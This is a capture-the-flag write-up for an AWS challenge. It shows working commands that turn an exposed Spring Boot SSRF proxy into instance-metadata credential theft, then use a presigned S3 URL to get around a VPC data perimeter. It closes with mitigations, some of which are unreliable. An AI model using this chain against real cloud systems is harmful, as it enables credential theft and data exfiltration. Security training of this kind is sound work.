# Perimeter Leak

**Challenge:** #1 — Perimeter Leak  
**Flag:** `WIZ_CTF_Presigned_Urls_Are_Everywhere`

---

## Description

> After weeks of exploits and privilege escalation you've gained access to what you hope is the final server that you can then use to extract out the secret flag from an S3 bucket.  
> It won't be easy though. The target uses an AWS data perimeter to restrict access to the bucket contents.

Access credentials for the challenge server are provided: `ctf:88sPVWyC2P3p`

> "AWS data perimeters are a very strong security mitigation, but I wanted to show a way in which things can go wrong using an important feature of AWS that is common in larger applications, but that many do not have experience with." — Scott Piper

---

## Attack Chain Summary

```
Spring Boot Actuator → /proxy SSRF → IMDSv2 credential theft
→ Presigned URL generation → proxy route (VPC) → data perimeter bypass → flag
```

---

## Step 1 — Discover the Actuator and Proxy Endpoint

Spring Boot Actuator is a common misconfiguration that exposes internal endpoints publicly. Start by probing:

```bash
curl -s https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/actuator
```

The response lists all available actuator endpoints, including `/actuator/mappings`. Fetching that reveals every registered Spring MVC route:

```bash
curl -s https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/actuator/mappings | \
  python3 -c "import json,sys; d=json.load(sys.stdin); \
  [print(p['requestMappingConditions']['patterns']) \
   for c in d['contexts'].values() \
   for p in c['mappings'].get('dispatcherServlets',{}).get('dispatcherServlet',[])]"
```

This reveals a hidden `/proxy` endpoint that takes a `url` query parameter and makes a server-side HTTP request to it — a classic **SSRF proxy**.

---

## Step 2 — Reach IMDS via the SSRF Proxy

EC2 instances expose instance metadata at `http://169.254.169.254`. IMDSv2 requires a session token obtained via a PUT request. The `/proxy` endpoint lets us do both:

**Step 2a — Get IMDSv2 token:**

```bash
TOKEN=$(curl -s -X PUT \
  "https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
```

**Step 2b — Use token to get IAM role name:**

```bash
ROLE=$(curl -s \
  "https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
  -H "X-aws-ec2-metadata-token: $TOKEN")
# → challenge01-5592368
```

**Step 2c — Steal role credentials:**

```bash
curl -s \
  "https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/challenge01-5592368" \
  -H "X-aws-ec2-metadata-token: $TOKEN"
```

Response (abbreviated):

```json
{
  "AccessKeyId": "ASIARK7LBOHXJ6HENAKW",
  "SecretAccessKey": "jPMN5r4OZK3X8ejiS9d7VB+tf8IfWYJ5bqcmKGHF",
  "Token": "IQoJb3JpZ2lu...",
  "Expiration": "2026-05-20T15:08:59Z"
}
```

The instance is `i-0bfc4291dd0acd279` in account `092297851374`, running as role `challenge01-5592368`.

---

## Step 3 — Enumerate the S3 Bucket

Using the stolen credentials:

```bash
export AWS_ACCESS_KEY_ID=ASIARK7LBOHXJ6HENAKW
export AWS_SECRET_ACCESS_KEY=jPMN5r4OZK3X8ejiS9d7VB+tf8IfWYJ5bqcmKGHF
export AWS_SESSION_TOKEN=IQoJb3JpZ2lu...
export AWS_DEFAULT_REGION=us-east-1

aws s3 ls s3://challenge01-470f711/
# → PRE private/
# → hello.txt (29 bytes)

aws s3 cp s3://challenge01-470f711/private/flag.txt -
# → 403 Forbidden
```

The data perimeter (S3 bucket policy with `aws:SourceVpc` or `aws:SourceVpce` condition) blocks all direct access to `private/flag.txt` from outside the VPC — even with valid credentials.

---

## Step 4 — Bypass the Data Perimeter with a Presigned URL via the Proxy

The key insight: **presigned URLs** embed AWS credentials into the URL itself and are validated at S3 without any IAM identity check at the caller. The S3 bucket policy still checks `aws:SourceVpc`, but that check evaluates where the HTTP **request** originates, not where the credentials came from.

By routing the presigned URL request through the `/proxy` endpoint on the EC2 instance (which is **inside the VPC**), the request satisfies the data perimeter.

**Critical gotcha:** The presigned URL contains `&` characters, which would be interpreted as additional query parameters if passed raw to `/proxy?url=...`. The entire presigned URL must be **URL-encoded** before use.

```python
import boto3, urllib.parse, subprocess

s3 = boto3.client('s3',
    region_name='us-east-1',
    aws_access_key_id='ASIARK7LBOHXJ6HENAKW',
    aws_secret_access_key='jPMN5r4OZK3X8ejiS9d7VB+tf8IfWYJ5bqcmKGHF',
    aws_session_token='IQoJb3JpZ2lu...'
)

# Generate presigned URL (valid for 1 hour)
presigned = s3.generate_presigned_url(
    'get_object',
    Params={'Bucket': 'challenge01-470f711', 'Key': 'private/flag.txt'},
    ExpiresIn=3600
)

# URL-encode the presigned URL so the proxy receives it as a single parameter
encoded = urllib.parse.quote(presigned, safe='')
proxy_url = f"https://challenge01.cloud-champions.com/proxy?url={encoded}"

result = subprocess.run(
    ['curl', '-s', '-u', 'ctf:88sPVWyC2P3p', proxy_url],
    capture_output=True, text=True
)
print(result.stdout)
# → The flag is: WIZ_CTF_Presigned_Urls_Are_Everywhere
```

The request flow:
1. Our machine generates the presigned URL using stolen IAM credentials
2. We send the presigned URL to the Spring Boot `/proxy` endpoint
3. The proxy (running on the VPC EC2 instance) makes the S3 request from inside the VPC
4. S3 validates: ✅ presigned URL signature is valid, ✅ request originates from within the VPC
5. Flag is returned in the response

---

## Flag

```
WIZ_CTF_Presigned_Urls_Are_Everywhere
```

---

## Key Takeaways

| Vulnerability | Detail |
|---|---|
| **Spring Boot Actuator exposure** | `/actuator/mappings` revealed a hidden SSRF proxy endpoint |
| **SSRF → IMDSv2 credential theft** | The `/proxy` endpoint reached the instance metadata service |
| **Data perimeter bypass via presigned URLs** | Presigned URLs move the authentication into the URL itself; routing through the VPC satisfies `aws:SourceVpc` |

### Defensive Mitigations

- **Lock down Spring Boot Actuator**: Restrict `/actuator` endpoints to loopback/internal networks only. Never expose them publicly.
- **Implement IMDSv2 enforcement**: Enable `HttpTokens: required` on all EC2 instances. This alone does not prevent this attack since the proxy supports PUT requests, but it is a baseline requirement.
- **Restrict the SSRF proxy**: The `/proxy` endpoint should use an allowlist of permitted target hosts. SSRF proxies that accept arbitrary URLs are inherently dangerous.
- **Data perimeter limitations**: AWS data perimeters based on `aws:SourceVpc` are strong, but presigned URLs can be used to make requests appear to come from trusted network locations. Consider also using `aws:PrincipalOrgID` and reviewing which principals can generate presigned URLs.
- **Use IMDSv2 hop limit**: Set `HttpPutResponseHopLimit: 1` on EC2 instances to prevent SSRF chains from reaching IMDS (requests via an application proxy have a hop count of 2).
